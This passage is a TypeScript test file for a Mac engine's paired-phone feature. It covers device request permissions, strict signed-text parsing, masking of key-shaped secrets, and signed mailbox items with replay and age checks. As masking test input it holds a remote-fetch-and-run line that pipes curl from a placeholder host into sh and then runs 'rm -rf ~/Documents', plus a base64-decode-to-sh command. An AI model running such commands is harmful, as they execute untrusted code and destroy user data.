// Paired devices in the engine (docs/iphone.md sections 3 to 5.7, #673), with a stand-in for pi² Remote written here.
//
// First what needs no engine: the device lists of answers.ts, with every request of the person's two lists a device
// may send named below with its reason, so that nothing reaches a phone by default; the start-up check; the readers'
// strictness; masking; and sealed items from the mailbox, checked against a real store, through a restart.
//
// Then a real engine on a throwaway data folder, whose pi² Remote is a stand-in (`PI2_REMOTE_STAND_IN`): a small
// program the engine starts as its own child, with the engine's end of a socket pair as its descriptor 3, which joins
// that socket to one this test listens on. So this test plays pi² Remote and the phone behind it, with keys of its
// own and App Attest's stand-in (`PI2_APP_ATTEST_STAND_IN`): pairing with the digits typed, one claim per window,
// attaching and resuming with both signatures, the device's table in a session, what a device is never sent, the log,
// suspension, the end of a session, revocation, and the preview switch, with which off no socket pair is made.

import assert from "node:assert/strict";
import { type ChildProcess, execFileSync, spawn } from "node:child_process";
import { createHash, createHmac, generateKeyPairSync, type KeyObject, randomBytes, sign } from "node:crypto";
import { existsSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { createServer, type Socket } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { BACKGROUND_CONTEXT as context } from "@earendil-works/chord/context";
import { createModels } from "@earendil-works/pi-ai";
import { createRegistry, Harness } from "@earendil-works/pi-durable";
import { openNodeSqliteStorage } from "@earendil-works/pi-durable/storage/sqlite/node";
import { allowsHiddenApproval, checkDeviceLists, deviceLogged, HIDDEN_FROM_THE_PHONE, deviceMay, devicePlacement, type DeviceSession, ONLY_FROM_THE_HELPER, ONLY_ON_THE_MAC, OPEN_WITH_FACE_ID, PERSON_REQUESTS } from "../src/answers.ts";
import { APPROVAL_DEPTH, checkRequestItem, type Device, deviceRequests, DeviceLog, Devices, devicesState, flushDeviceLog, fromBase64url, hidesSomething, logDevice, macNameNow, pairClaim, PART_HIDDEN, remoteHooks, revokedWatchers, shownName, summarize, TOO_DEEP, ITEM_TOO_OLD, ITEM_TOO_OLD_FACE, KEY_HIDDEN, maskKeys, readSigned, SECOND_CLAIM, wireDevices } from "../src/devices.ts";
import type { Client } from "../src/clients.ts";
import { ANSWER_NOT_SENT, DEVICE_LINE_FAILED, forDevice, MAX_HELPER_LINE, SESSION_OVER } from "../src/remote.ts";
import { EngineClient, PATIENT_MS, standInApp, stop, until } from "./patience.ts";

process.env.PI2_DEMO_TOKENS_PER_SECOND ??= "100000";
process.env.PI2_LOGIN_SHELL ??= "off";
const work = realpathSync(mkdtempSync(join(tmpdir(), "pi2-dev-")));
const KEYCHAIN_SERVICE = `dev.pi2.credentials.test-devices-${process.pid}`;
const engines: ChildProcess[] = [];
// Stopped from outside, it still cleans up: the exit handler below runs.
process.on("SIGTERM", () => process.exit(143));
process.on("SIGINT", () => process.exit(130));
process.on("exit", () => {
	for (const child of engines) if (child.exitCode === null && child.signalCode === null) child.kill("SIGKILL");
	rmSync(work, { recursive: true, force: true });
	try {
		while (true) execFileSync("/usr/bin/security", ["delete-generic-password", "-s", KEYCHAIN_SERVICE], { stdio: "ignore" });
	} catch {
		// None left.
	}
});

function step(text: string): void {
	console.log(`ok  ${text}`);
}

// ---- The device lists (4.1, 4.2)

/**
 * Every request of FOR_THE_PERSON and FOR_THE_PERSON_SETTINGS that a device may send, with its reason as answers.ts
 * gives it and whether it widens reach: "always" (WITH_FACE_ID), "never", or "by its parameters". A new entry of
 * either list that a device's table lets through fails here until it is named, so nothing reaches a phone by default.
 */
const PERSON_REQUESTS_A_DEVICE_MAY_SEND: Record<string, [reason: string, widens: "always" | "never" | "by its parameters"]> = {
	"inbox.decide": ["an answer to an approval; always, rule, or once past a widening switch widens", "by its parameters"],
	"inbox.answer": ["an answer to an agent's question", "never"],
	"needs.answer": ["an answer under Needs you; allowing a reach request or Start anyway on a limit widens", "by its parameters"],
	"conversation.create": ["a new conversation with an agent the person has; past a limit, it widens", "by its parameters"],
	"chat.continueWithAgent": ["Continue with an Agent; with an explicit folder it is the Mac's, past a limit it widens", "by its parameters"],
	"schedules.runNow": ["running a schedule the person made; past a limit, it widens", "by its parameters"],
	"agents.allowEverything": ["turning Allow everything off narrows; on is the Mac's alone (question 5)", "never"],
	"agents.save": ["an agent's settings, as the person changes them at the Mac", "always"],
	"agents.duplicate": ["a copy with the source's reach", "always"],
	"agents.delete": ["cannot be undone", "always"],
	"agents.restore": ["puts back what was put away, with its reach", "always"],
	"agents.updateFromTemplate": ["an agent's settings from a template", "always"],
	"conversation.configure": ["a conversation's access, folder and model", "always"],
	"conversation.carryOn": ["the person's ordinary act", "never"],
	"conversation.fork": ["copies the conversation's access, agent and project", "always"],
	"conversation.retry": ["Try Again, on the same model or another the person has (4.2, two rows)", "never"],
	"conversation.archive": ["putting away narrows", "never"],
	"conversation.unarchive": ["gives an archived conversation back its access", "always"],
	"conversation.delete": ["cannot be undone", "always"],
	"chat.set": ["chat mode's settings; turning the web or memory on, or new instructions, widen", "by its parameters"],
	"memory.setEnabled": ["a memory switch turned on plants what an agent read", "always"],
	"rules.add": ["an allowed command", "always"],
	"rules.remove": ["removing an allowed command narrows", "never"],
	"schedules.save": ["schedules start work with nobody there", "always"],
	"schedules.delete": ["deleting a schedule narrows", "never"],
	"coauthor.set": ["the person's ordinary act", "never"],
	"projects.create": ["a new project; with a folder only one the Mac offers (P29), until then none; with a template it copies an agent, which widens", "by its parameters"],
	"projects.set": ["the switches of 8.1 and the limits", "always"],
	"projects.archive": ["putting away narrows", "never"],
	"projects.unarchive": ["puts back what was put away, with its reach", "always"],
	"projects.delete": ["cannot be undone", "always"],
	"projects.restoreConversation": ["its dry run reads; restoring puts back what was put away, with its reach, which widens", "by its parameters"],
	"projects.startFresh": ["the person's ordinary act", "never"],
	"projects.setOrchestrator": ["the orchestrator's role carries its switches and tools", "always"],
	"projects.watch": ["reading: it chooses which of a project's tabs this session watches, and attaches nothing (decision 27)", "never"],
	"projects.addAgent": ["making an agent", "always"],
	"projects.rules.add": ["the person's ordinary act", "never"],
	"projects.rules.edit": ["a project's rules", "always"],
	"projects.rules.move": ["a project's rules", "always"],
	"projects.rules.remove": ["a project's rules", "always"],
	"changes.undo": ["undo can restore what the person narrowed", "always"],
	"work.create": ["filing work, as the person does on the board", "never"],
	"work.act": ["what the person does by hand on the board; it merges nothing (4.2); past a limit, it widens", "by its parameters"],
	"worktree.create": ["the person's ordinary act", "never"],
	"worktree.remove": ["cannot be undone", "always"],
	"github.attach": ["a repository attached", "always"],
	"github.detach": ["detaching narrows", "never"],
	"github.merge": ["a merge, as the person merges at the Mac", "always"],
	"github.sendBack": ["the person's ordinary act", "never"],
	"github.settle": ["the person's answer to a write whose outcome is unknown; Not done lets the write be made again, which widens", "by its parameters"],
	"usage.setBudget": ["raising the budget unbinds spending", "always"],
	"settings.setCompaction": ["the person's ordinary act", "never"],
	"settings.setAutoArchive": ["the person's ordinary act", "never"],
	"settings.setAwake": ["the person's ordinary act", "never"],
	"recovery.dismiss": ["a notice dismissed", "never"],
	"limits.dismiss": ["a notice dismissed", "never"],
};

{
	const relay: DeviceSession = { path: "relay", approvalSwitch: () => null, approvalHidden: () => false };
	const sent = PERSON_REQUESTS.filter((method) => devicePlacement(method)?.list !== "MAC_ONLY");
	assert.deepEqual([...sent].sort(), Object.keys(PERSON_REQUESTS_A_DEVICE_MAY_SEND).sort(), "every person's request a device may send is named here");
	for (const [method, [reason, widens]] of Object.entries(PERSON_REQUESTS_A_DEVICE_MAY_SEND)) {
		const placed = devicePlacement(method)!;
		assert.equal(placed.why, reason, `${method}'s reason`);
		assert.equal(placed.list, widens === "always" ? "WITH_FACE_ID" : "FROM_A_DEVICE", `${method}'s list`);
		if (widens === "always") assert.equal(deviceMay(method, {}, relay), "face", method);
		if (widens === "never") assert.notEqual(deviceMay(method, { on: false, folder: null, dryRun: true }, relay), "face", method);
	}
	for (const method of PERSON_REQUESTS) assert.ok(devicePlacement(method)!.why.length > 0, `${method} has a reason`);
	step(`the ${sent.length} requests of the person's lists a device may send are each named, with the reason and whether it widens`);

	const switchOf = (name: string | null): DeviceSession => ({ path: "relay", approvalSwitch: () => name as never, approvalHidden: () => false });
	assert.equal(deviceMay("agents.allowEverything", { id: "a", on: true }, relay), "no", "Allow everything on is the Mac's alone");
	assert.equal(deviceMay("agents.allowEverything", { id: "a", on: false }, relay), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "once" }, relay), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "deny" }, switchOf("merge")), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "once" }, switchOf("startAgents")), "yes");
	for (const name of ["merge", "release", "passLimits", "makeAgents", "addRules"]) assert.equal(deviceMay("inbox.decide", { id: "x", decision: "once" }, switchOf(name)), "face", name);
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "always" }, relay), "face");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "rule" }, relay), "face");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "sideways" }, relay), "no");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "reach", allow: true } }, relay), "face");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "reach", allow: false } }, relay), "yes");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "limit", start: true } }, relay), "face");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "limit", start: false } }, relay), "yes");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "approval", decision: "once" } }, switchOf("release")), "face");
	assert.equal(deviceMay("needs.answer", { id: "x", answer: { kind: "question", text: "y" } }, relay), "yes");
	// An approval the phone was not shown whole: no allowing answer from it, by the engine's own record; denying stays.
	const hidden: DeviceSession = { path: "relay", approvalSwitch: () => null, approvalHidden: (id) => id === "masked" };
	for (const decision of ["once", "always", "rule"]) {
		assert.equal(deviceMay("inbox.decide", { id: "masked", decision }, hidden), "no", decision);
		assert.equal(deviceMay("needs.answer", { id: "masked", answer: { kind: "approval", decision } }, hidden), "no", decision);
	}
	assert.equal(deviceMay("inbox.decide", { id: "masked", decision: "deny" }, hidden), "yes");
	assert.equal(deviceMay("needs.answer", { id: "masked", answer: { kind: "approval", decision: "deny" } }, hidden), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "shown", decision: "once" }, hidden), "yes");
	assert.ok(allowsHiddenApproval("inbox.decide", { id: "masked", decision: "once" }, hidden) && !allowsHiddenApproval("inbox.decide", { id: "masked", decision: "deny" }, hidden));
	assert.equal(deviceMay("conversation.create", { confirmLimit: "r" }, relay), "face");
	assert.equal(deviceMay("chat.continueWithAgent", { id: 1, cwd: "/tmp" }, relay), "no", "an explicit folder is the Mac's");
	assert.equal(deviceMay("github.settle", { happened: false }, relay), "face");
	assert.equal(deviceMay("chat.set", { memory: false }, relay), "yes");
	assert.equal(deviceMay("chat.set", { instructions: "x" }, relay), "face");
	assert.equal(deviceMay("projects.create", { folder: "/Users" }, relay), "no", "a folder the Mac does not offer");
	assert.equal(deviceMay("projects.create", { folder: null }, relay), "yes");
	assert.equal(deviceMay("projects.create", { folder: null, template: "forge" }, relay), "face", "a template copies an agent with its reach, as agents.duplicate does");
	for (const method of ["providers.setKey", "variables.set", "mcp.save", "devices.pairStart", "devices.pairConfirm", "devices.set", "remote.attach", "test-copy.answerer", "settings.setAgentDefault", "no.such"]) {
		assert.equal(deviceMay(method, {}, relay), "no", method);
	}
	const mailbox: DeviceSession = { path: "mailbox", approvalSwitch: () => null, approvalHidden: () => false };
	assert.equal(deviceMay("submit", { id: 1, text: "hi" }, mailbox), "yes");
	assert.equal(deviceMay("submit", { id: 1, text: "é".repeat(4_000) }, mailbox), "yes", "4,000 characters, not bytes");
	assert.equal(deviceMay("submit", { id: 1, text: "x".repeat(4_001) }, mailbox), "no");
	assert.equal(deviceMay("submit", { id: 1, text: "hi", attachments: [] }, mailbox), "no", "text only");
	assert.equal(deviceMay("abort", { id: 1 }, mailbox), "yes");
	assert.equal(deviceMay("inbox.decide", { id: "x", decision: "always" }, mailbox), "face");
	assert.equal(deviceMay("github.merge", {}, mailbox), "no", "a change that widens needs a channel");
	assert.equal(deviceMay("engine.info", {}, mailbox), "no", "reading needs a channel");
	assert.equal(deviceLogged("engine.info", {}), false, "reading is not logged");
	assert.equal(deviceLogged("conversation.export", {}), true, "an export is");
	assert.equal(deviceLogged("projects.restoreConversation", { dryRun: true }), false);
	assert.equal(deviceLogged("projects.restoreConversation", {}), true);
	step("the table: Allow everything on, secrets, programs, pairing and remote.* stay the Mac's; answers widen by what they allow; the mailbox takes its rows alone");

	assert.throws(() => checkDeviceLists(["engine.info", "made.up"], []), /made\.up belongs to 0 device lists/);
	assert.throws(() => checkDeviceLists(["engine.info"], ["remote.made.up"]), /remote\.made\.up is a handler of pi² Remote's connection, and is not in FOR_THE_HELPER/);
	assert.throws(() => checkDeviceLists(["remote.attach"], []), /remote\.attach belongs to 0 device lists[\s\S]*FOR_THE_HELPER/);
	assert.throws(() => checkDeviceLists(["engine.info"], [], [new Set(["engine.info"]), new Set(["engine.info"])]), /engine\.info belongs to 2 device lists/);
	assert.throws(() => checkDeviceLists(["engine.info"], [], [new Set(["engine.info", "files.preview"])], new Set()), /files\.preview is in a device list and has no handler/);
	assert.throws(() => checkDeviceLists(["engine.info"], [], [new Set(["engine.info"])], new Set(["remote.mailboxIn"])), /remote\.mailboxIn is in FOR_THE_HELPER and has no handler/);
	assert.doesNotThrow(() => checkDeviceLists(["engine.info"], ["remote.attach"], [new Set(["engine.info", "test-copy.fill"])], new Set(["remote.attach"])), "a test copy's own request may be absent");
	step("the start-up check refuses a handler in no device list, in two, or pi² Remote's anywhere else, and a name placed with no handler");
}

// ---- Readers, masking, what a device is sent

{
	assert.ok(readSigned('{"v":2,"kind":"pair"}', ["v", "kind"]));
	for (const text of ['{"v":2, "kind":"pair"}', '{"v":2,"kind":"pair"} ', '{"kind":"pair","v":2}', '{"v":2,"kind":"pair","x":1}', '{"v":2,"v":2,"kind":"pair"}', '{"v":2.0,"kind":"pair"}', '{"v":2,"kind":"p\\u0061ir"}', "[2]"]) {
		assert.equal(readSigned(text, ["v", "kind"]), null, text);
	}
	assert.ok(fromBase64url("AAEC", 3));
	for (const text of ["AAEC=", "AA+C", "AAF", "AAECD", " AAEC"]) assert.equal(fromBase64url(text), null, text);
	step("a signed text is read only as written, every field in order and nothing after; base64url in its one form");

	const keys = ["sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789", "sk-proj-abcdefghijklmnopqrstuvwxyz012345", "sk-abcdefghijklmnopqrstuvwxyz0123", "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB", "AKIAABCDEFGHIJKLMNOP", "xoxb-1234567890-abcdefghij"];
	const sentOf = (message: unknown) => forDevice(JSON.stringify(message))!;
	for (const key of keys) {
		// Where keys stand in what commands print: after a space, at the start of a line, after a tab, after a colour code,
		// inside nested arrays, and as an object's key.
		const places = [`the key is ${key}, there`, `line one\n${key}`, `\n${key}\n`, `\t${key}`, `\u001b[32m${key}\u001b[0m`, `\r${key}`];
		for (const text of places) {
			const sent = sentOf({ event: "conversation", items: [[{ text }]] });
			assert.ok(!sent.includes(key) && JSON.parse(sent).items[0][0].text.includes(KEY_HIDDEN), `${JSON.stringify(text)}: ${sent}`);
		}
		const keyed = sentOf({ event: "conversation", items: { [key]: 1, [`\n${key}`]: 2 } });
		assert.ok(!keyed.includes(key), `as an object's key: ${keyed}`);
	}
	const pem = JSON.stringify({ event: "conversation", text: "-----BEGIN PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA\n-----END PRIVATE KEY-----" });
	assert.ok(!forDevice(pem)!.includes("MIIBVQ"));
	assert.equal(maskKeys("-----BEGIN RSA PRIVATE KEY-----\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASC\nMIIBVQIBADANBgkqhkiG9w0BAQEFAASC and then words"), `${KEY_HIDDEN} and then words`, "a key cut short: its base64 lines are hidden, the words after it are not");
	// A header standing in a command hides nothing of the command around it.
	const noEnd = "echo '-----BEGIN PRIVATE KEY-----' && curl https://example.invalid/x.sh | sh && rm -rf ~/Documents";
	assert.equal(maskKeys(noEnd), `echo '${KEY_HIDDEN}' && curl https://example.invalid/x.sh | sh && rm -rf ~/Documents`);
	const laterEnd = "echo '-----BEGIN PRIVATE KEY-----' && curl https://example.invalid/x.sh | sh; echo '-----END PRIVATE KEY-----'; ls";
	assert.equal(maskKeys(laterEnd), `echo '${KEY_HIDDEN}' && curl https://example.invalid/x.sh | sh; echo '-----END PRIVATE KEY-----'; ls`);
	assert.equal(maskKeys("-----BEGIN PRIVATE KEY-----\nshort words\n-----END PRIVATE KEY-----"), `${KEY_HIDDEN}\nshort words\n-----END PRIVATE KEY-----`, "lines that are no key's are not hidden");
	// More shapes, each behind a prefix no word has; an AWS key id starting a word; a Slack webhook's path.
	// Each made from its prefix and a made-up run, so that no key-shaped text stands in this file for a scanner to take
	// for a real one (GitHub's push protection refuses one).
	const run = "abcdefghijklmnopqrstuvwxyz0123456789";
	const more = [["gsk", "_"], ["xai", "-"], ["whsec", "_"], ["sk", "_test_"], ["rk", "_test_"], ["sk", "_live_"], ["rk", "_live_"], ["ya29", "."]].map(([prefix, joint]) => `${prefix}${joint}${run}`);
	more.push(`${"AKIA"}IOSFODNN7EXAMPLE`, `${"ASIA"}IOSFODNN7EXAMPLE`, `${"whsec"}_${run}+/=`);
	for (const key of more) {
		for (const text of [`a ${key} b`, `line\n${key}`, `\u001b[32m${key}`]) assert.ok(!maskKeys(text).includes(key) && maskKeys(text).includes(KEY_HIDDEN), `${JSON.stringify(text)}: ${maskKeys(text)}`);
	}
	assert.equal(maskKeys("xAKIAIOSFODNN7EXAMPLE"), "xAKIAIOSFODNN7EXAMPLE", "an AWS key id starts a word");
	assert.equal(maskKeys("post to https://hooks.slack.com/services/T000/B000/XXXXXXXXXXXXXXXX now"), `post to https://hooks.slack.com/services/${KEY_HIDDEN} now`);
	assert.equal(maskKeys("a desk-chair and sk-short"), "a desk-chair and sk-short", "words are left as they are");
	// Names as a phone shows them (RemoteKit's ShownText): stripped, cut to 128 bytes between characters, or "Mac".
	assert.equal(shownName("Kim\u200D's\u202E Mac", "Mac"), "Kim's Mac");
	assert.equal(shownName("\u200B\u202E\u2066\uFEFF \u0007", "Mac"), "Mac");
	const emoji = shownName("\u{1F469}\u200D\u{1F4BB}".repeat(40), "Mac");
	assert.ok(Buffer.byteLength(emoji) <= 128 && Buffer.from(emoji).toString() === emoji && !emoji.includes("\u200D"), emoji);
	const proto = forDevice('{"id":1,"result":{"__proto__":{"polluted":1}}}')!;
	assert.ok(proto.includes('"__proto__":{"polluted":1}') && ({} as { polluted?: number }).polluted === undefined, "a key __proto__ stays a key");
	// A long run after a key's prefix: masked whole, at once, and nothing thrown (a greedy pattern overflowed V8's stack).
	const long = `${"sk-"}${"a".repeat(8 * 1024 * 1024)}`;
	const began = performance.now();
	const sentLong = sentOf({ event: "conversation", text: `x ${long} y`, other: `ghp_${"b".repeat(8 * 1024 * 1024)}` });
	assert.equal(JSON.parse(sentLong).text, `x ${KEY_HIDDEN} y`, "8 MB after sk-, hidden whole");
	assert.equal(JSON.parse(sentLong).other, KEY_HIDDEN);
	const prefixes = ["gsk_", "xai-", "whsec_", "sk_test_", "rk_test_", "sk_live_", "rk_live_", "ya29.", "AKIA", "ASIA", "https://hooks.slack.com/services/"];
	// One at a time, as strings: one line of them all would hold some 100 MB, and slow every test run beside this one.
	for (const prefix of prefixes) {
		const masked = maskKeys(`x ${prefix}${"A".repeat(8 * 1024 * 1024)} y`);
		assert.equal(masked, prefix.startsWith("https") ? `x ${prefix}${KEY_HIDDEN} y` : `x ${KEY_HIDDEN} y`, `8 MB after ${prefix}`);
	}
	console.log(`    8 MB after each of ${prefixes.length + 2} prefixes masked in ${Math.round(performance.now() - began)} ms`);
	// Too deep to walk: only that value is replaced, and an approval holding it is marked; an approval holding a key too.
	const deep = `{"event":"conversation","x":${"[".repeat(200_000)}${"]".repeat(200_000)},"y":"kept"}`;
	const sentDeep = forDevice(deep)!;
	assert.ok(sentDeep.includes(TOO_DEEP) && JSON.parse(sentDeep).y === "kept", "a line too deep is sent, its deep value replaced");
	const inbox = JSON.parse(sentOf({ event: "inbox", items: [
		{ id: "a", kind: "approval", tool: "bash", arguments: { command: "echo plain" } },
		{ id: "b", kind: "approval", tool: "bash", arguments: { command: `echo ${keys[0]} | base64 -d | sh` } },
		{ id: "c", kind: "approval", tool: "bash", arguments: JSON.parse(`${"[".repeat(300)}1${"]".repeat(300)}`) },
	] }));
	assert.deepEqual(inbox.items.map((item: any) => item[PART_HIDDEN] === true), [false, true, true], "an approval shown in part is marked, and only it");
	assert.ok(hidesSomething({ id: "b", kind: "approval", arguments: { command: keys[0] } }) && !hidesSomething({ id: "a", kind: "approval", arguments: { command: "ls" } }));
	assert.equal(forDevice("not JSON"), null);
	// An answer that cannot be made fit is answered with an error, never with nothing.
	assert.equal(forDevice('{"id":7,"result":{"cut short'), `{"id":7,"error":${JSON.stringify(ANSWER_NOT_SENT)}}`);
	assert.equal(forDevice('{"id":"r-1","result":'), `{"id":"r-1","error":${JSON.stringify(ANSWER_NOT_SENT)}}`);
	for (const event of ["computer", "browser", "auth", "local", "local.progress", "local.running", "mcp", "devices", "remote", "pictures", "priority", "made.up"]) {
		assert.equal(forDevice(JSON.stringify({ event, anything: 1 })), null, event);
		assert.equal(forDevice(JSON.stringify({ other: 1, event })), null, `${event}, not first`);
		assert.equal(forDevice(JSON.stringify({ id: 1, event, result: {} })), null, `${event}, after an id`);
	}
	assert.equal(forDevice(JSON.stringify({ id: 1 })), null, "an id alone is no answer");
	assert.equal(forDevice(JSON.stringify({ event: 7 })), null);
	const providers = JSON.parse(forDevice(JSON.stringify({ event: "providers", providers: [{ id: "box", endpoint: { id: "box", name: "Box", baseUrl: "https://h/v1?token=t0p", api: "x", models: [] }, ask: { can: true, url: "https://h" } }] }))!);
	assert.deepEqual(providers.providers[0].endpoint, { id: "box", name: "Box" });
	assert.deepEqual(providers.providers[0].ask, { can: true, url: null });
	assert.equal(forDevice('{"id":3,"result":{"key":"sk-ant-api03-abcdefghijklmnopqrstuvwxyz"}}'), `{"id":3,"result":{"key":"${KEY_HIDDEN}"}}`);
	step("what a device is sent: only the events named for it, endpoints by name only, and no key-shaped string wherever it stands; a line that cannot be masked is dropped");
}

// ---- A phone of this test's own

const b64url = (bytes: Uint8Array) => Buffer.from(bytes).toString("base64url");
const spki = (key: KeyObject) => b64url(key.export({ type: "spki", format: "der" }));
const p256 = () => generateKeyPairSync("ec", { namedCurve: "P-256" });
const signText = (text: string, key: KeyObject) => b64url(sign("sha256", Buffer.from(text), { key, dsaEncoding: "ieee-p1363" }));

class Phone {
	readonly device = p256();
	readonly presence = p256();
	readonly record = p256();
	readonly channel = randomBytes(32);
	readonly keyId = randomBytes(32).toString("base64");
	id = "";
	readonly name: string;
	readonly build: string;

	constructor(name = "Alex's iPhone", build = "7") {
		this.name = name;
		this.build = build;
	}

	description() {
		return { name: this.name, model: "iPhone 17 Pro", system: "iOS 27.1", build: this.build, deviceKey: spki(this.device.publicKey), presenceKey: spki(this.presence.publicKey), channelKey: b64url(this.channel), recordKey: spki(this.record.publicKey) };
	}

	/** The `pair` line's content, with App Attest's stand-in made for this key and channel unless told otherwise. */
	claim(pairing: string, binding: Buffer, challenge: Buffer, attest: Record<string, unknown> = {}) {
		const signed = JSON.stringify({ v: 2, kind: "pair", pairing, binding: b64url(binding) });
		const clientDataHash = createHash("sha256").update(challenge).update(this.device.publicKey.export({ type: "spki", format: "der" })).update(binding).digest("base64url");
		const attestation = { standIn: "pi2-app-attest", appId: "ABCDE12345.dev.pi2.ios", keyId: this.keyId, clientDataHash, environment: "development", validationCategory: 3, bundleVersion: this.build, ...attest };
		return { v: 2, device: this.description(), attestation: b64url(Buffer.from(JSON.stringify(attestation))), keyId: this.keyId, signed, signature: signText(signed, this.device.privateKey) };
	}

	/** An attach or resume: `signed` by the device key and the presence key, unless told otherwise. */
	attach(fields: { pairing: string; challenge: string; binding: Buffer; session?: string | null; at?: number }, keys: { device?: KeyObject; presence?: KeyObject | null } = {}) {
		const signed = JSON.stringify({ v: 2, kind: "attach", pairing: fields.pairing, device: this.id, session: fields.session ?? null, binding: b64url(fields.binding), challenge: fields.challenge, build: this.build, at: fields.at ?? Date.now() });
		const presence = keys.presence === null ? "" : signText(signed, keys.presence ?? this.presence.privateKey);
		return { signed, signature: signText(signed, keys.device ?? this.device.privateKey), presence };
	}

	/** A request sealed for the mailbox, once opened. */
	item(pairing: string, method: string, params: Record<string, unknown>, options: { at?: number; nonce?: string; presence?: KeyObject | null } = {}) {
		const signed = JSON.stringify({ v: 2, kind: "request", pairing, device: this.id, method, params, nonce: options.nonce ?? b64url(randomBytes(16)), at: options.at ?? Date.now() });
		return { v: 2, request: { method, params }, signed, signature: signText(signed, this.device.privateKey), presence: options.presence === null ? "" : signText(signed, options.presence ?? this.presence.privateKey) };
	}
}

// ---- Sealed items from the mailbox, against a real store, through a restart (4.3)

{
	const folder = mkdtempSync(join(work, "store-"));
	const phone = new Phone();
	phone.id = `dev_${b64url(randomBytes(16))}`;
	const pairing = b64url(randomBytes(16));
	const record: Device = { id: phone.id, ...phone.description(), pendingPresenceKey: null, attestKeyId: phone.keyId, suspendedAt: null, pairedAt: Date.now(), lastSeenAt: null, lastPath: null, revokedAt: null };
	const open = async () => {
		const harness = await Harness.open(await openNodeSqliteStorage(join(folder, "session.sqlite")), { registry: createRegistry(), models: createModels() }, context);
		await wireDevices({ harness, context, log: () => {}, release: false, names: { conversation: () => undefined, project: () => undefined } });
		return harness;
	};
	let harness = await open();
	await harness.commit(async (tx) => {
		const doc = await tx.doc(Devices);
		doc.pairing = pairing;
		doc.remote = { ...doc.remote, preview: true, on: true };
		doc.macName = "Kim\u200D\u202E's Mac";
		doc.devices.push(record);
	}, context);
	await harness.close(context);
	harness = await open();
	assert.equal(macNameNow(), "Kim's Mac", "the Mac's name the payload and a phone are given, stripped");
	const none = () => null;
	const take = (item: unknown, now?: number) => checkRequestItem(phone.id, item, { approvalSwitch: none, approvalHidden: () => false }, now);
	const logged = async () => {
		await flushDeviceLog();
		return (await harness.snapshot(DeviceLog, context))?.entries.length ?? 0;
	};
	const suspended = () => devicesState().devices.find((one) => one.id === phone.id)!.suspendedAt !== null;
	// What the relay could hand pi² Remote "from" the device, with none of its keys: refused, and nothing written or counted.
	const stranger = new Phone();
	stranger.id = phone.id;
	for (let i = 0; i < 20; i++) {
		const unsignedItem = { ...phone.item(b64url(randomBytes(16)), `made.up.${i}`, {}), signature: "" };
		await assert.rejects(take(unsignedItem), /not signed by the device key/);
		await assert.rejects(take(stranger.item(pairing, "submit", { id: 4, text: `${i}` })), /not signed by the device key/);
	}
	assert.equal(await logged(), 0, "20 unsigned items and 20 a stranger signed write nothing in the log");
	assert.equal(suspended(), false, "and do not suspend the device");
	const good = phone.item(pairing, "submit", { id: 4, text: "from the train" });
	assert.deepEqual(await take(good), { method: "submit", params: { id: 4, text: "from the train" }, widens: false });
	await assert.rejects(take(good), /taken before/, "a nonce is taken once");
	const hourAgo = Date.now() - 3_600_000 - 1_000;
	assert.deepEqual((await take(phone.item(pairing, "inbox.decide", { id: "a", decision: "once" }, { at: hourAgo }))).widens, false, "an answer that does not widen keeps a day");
	await assert.rejects(take(phone.item(pairing, "inbox.decide", { id: "a", decision: "always" }, { at: hourAgo })), new RegExp(ITEM_TOO_OLD_FACE), "one that widens, an hour");
	assert.equal((await take(phone.item(pairing, "inbox.decide", { id: "a", decision: "always" }))).widens, true);
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "late" }, { at: Date.now() - 25 * 3_600_000 })), new RegExp(ITEM_TOO_OLD));
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "ahead" }, { at: Date.now() + 6 * 60_000 })), /ahead of the Mac's/);
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "x" }, { presence: null })), /presence signature/, "a presence signature is missing");
	await assert.rejects(take(phone.item(pairing, "submit", { id: 4, text: "x" }, { presence: p256().privateKey })), /presence signature/, "by another key");
	const forged = phone.item(pairing, "submit", { id: 4, text: "x" });
	await assert.rejects(take({ ...forged, request: { method: "submit", params: { id: 4, text: "y" } } }), /not the one signed/);
	await assert.rejects(take({ ...forged, signature: signText(forged.signed, p256().privateKey) }), /device key/);
	await assert.rejects(take({ ...forged, extra: 1 }), /not a request/, "no field it does not know");
	await assert.rejects(take(phone.item(pairing, "github.merge", { projectId: "p", number: 1 })), new RegExp(ONLY_ON_THE_MAC), "its row must allow the mailbox");
	await assert.rejects(take(phone.item(b64url(randomBytes(16)), "abort", { id: 4 })), /another device or pairing/);
	const replay = phone.item(pairing, "abort", { id: 4 });
	await take(replay);
	await harness.close(context);
	harness = await open();
	await assert.rejects(take(replay), /taken before/, "after a restart too");
	assert.equal(suspended(), false, "two refused presence signatures do not suspend");
	step("sealed items: the device key's signature first, before anything is logged or counted; then the presence signature, a day (an hour if it widens), its row, and each nonce once, stored before the answer, through a restart");

	// ---- The devices' log (4.4): bounded in what an entry holds, by device, and with repeated refusals made one
	const other = `dev_${b64url(randomBytes(16))}`;
	await logDevice({ device: other, path: "relay", method: "submit", summary: "Sent a message", presence: true, outcome: "done" });
	await logDevice({ device: phone.id, path: "relay", method: "pair", summary: "Paired", presence: false, outcome: "done" });
	await logDevice({ device: phone.id, path: "relay", method: "x".repeat(5_000), summary: "y".repeat(5_000), presence: true, outcome: "refused", why: "z".repeat(5_000) });
	await flushDeviceLog();
